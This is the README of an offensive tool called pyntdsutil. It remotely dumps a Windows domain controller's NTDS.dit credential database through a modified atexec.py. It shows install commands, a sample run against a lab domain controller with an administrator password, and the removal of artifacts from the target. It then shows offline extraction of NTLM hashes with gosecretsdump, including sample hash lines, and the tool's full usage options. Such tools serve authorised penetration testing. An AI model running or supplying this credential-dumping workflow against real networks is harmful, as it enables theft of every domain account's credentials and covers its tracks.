# pyntdsutil

Dump NTDS.dit remotely with ntdsutil.exe via a modified version of atexec.py.

## Installation via pipx

```ruby
python3 -m pip install pipx && python3 -m pipx ensurepath
python3 -m pipx install git+https://github.com/mrdanielvelez/pyntdsutil
```

## Example Output

```javascript
# pyntdsutil CRASH.LAB/Administrator:'Welcome1234!'@192.168.40.136
[*] Connected to 192.168.40.136 as CRASH.LAB\Administrator (Admin!)
[*] Dumping NTDS.dit with ntdsutil.exe
[*] NTDS.dit successfully dumped
[*] Downloading NTDS.dit, SYSTEM, and SECURITY
[*] Output NTDS dump files to dump_2023-10-08_pyntdsutil
[*] Deleted artifacts on target domain controller

# ls dump_pyntdsutil_2023-10-08 
NTDS.dit  SECURITY  SYSTEM
```

## Fast Offline Dump with [gosecretsdump](https://github.com/C-Sto/gosecretsdump)

```javascript
# go install github.com/C-Sto/gosecretsdump@latest
.. SNIP ..

# gosecretsdump -enabled -ntds ./NTDS.dit -system ./SYSTEM -out enabled_ntds.dit
gosecretsdump vDEV (@C__Sto)
Writing to file enabled_ntds.dit

# head enabled_ntds.dit -n 5
Administrator:500:aad3b435b51404eeaad3b435b51404ee:392fbe2844cb258735c4cbf449d31709:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:06a8518bcbf6fd969a2c6ac354d2df00:::
CRASH.LAB\employee1:1103:aad3b435b51404eeaad3b435b51404ee:b2af3f82705748459229772ae2ece0f6:::
CRASH.LAB\employee2:1104:aad3b435b51404eeaad3b435b51404ee:b2af3f82705748459229772ae2ece0f6:::
CRASH.LAB\employee3:1105:aad3b435b51404eeaad3b435b51404ee:b2af3f82705748459229772ae2ece0f6:::
```

## Usage

```javascript
# pyntdsutil -h
usage: pyntdsutil [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                [-dc-ip ip address] [-codec CODEC] [-output OUTPUT]
                target

Dump NTDS.dit remotely with ntdsutil.exe via a modified version of atexec.py.

positional arguments:
  target                [[domain/]username[:password]@]<target name or address>

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file
                        (KRB5CCNAME) based on target parameters. If valid credentials
                        cannot be found, it will use the ones specified in the command
                        line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the
                        domain part (FQDN) specified in the target parameter
  -codec CODEC          Sets encoding used (codec) from the target's output (default
                        "utf-8"). If errors are detected, run chcp.com at the target, map
                        the result with
                        https://docs.python.org/3/library/codecs.html#standard-encodings
                        and then execute pyntdsutil again with -codec and the
                        corresponding codec
  -output OUTPUT        Output directory to store dumped file

```
